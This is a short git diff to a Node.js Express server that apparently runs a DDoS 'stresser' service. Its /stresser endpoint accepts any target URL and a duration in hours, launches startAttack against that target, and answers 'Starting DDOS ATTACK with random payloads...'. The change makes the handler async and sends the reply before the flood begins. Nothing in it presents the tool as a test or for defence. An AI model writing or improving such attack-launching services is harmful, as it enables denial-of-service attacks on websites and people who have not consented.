@@ -376,7 +376,7 @@ const startAttack = (url, durationHours) => {
     });
 };
 
-app.get("/stresser", (req, res) => {
+app.get("/stresser", async (req, res) => {
     const url = req.query.url;
     const durationHours = parseFloat(req.query.duration) || 1;
     if (!url || !/^https?:\/\//.test(url)) {
@@ -386,8 +386,8 @@ app.get("/stresser", (req, res) => {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
     targetUrl = url;
+    await res.json({ message: "Starting DDOS ATTACK with random payloads..." });
     startAttack(targetUrl, durationHours);
-    res.json({ message: "Starting DDOS ATTACK with random payloads..." });
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
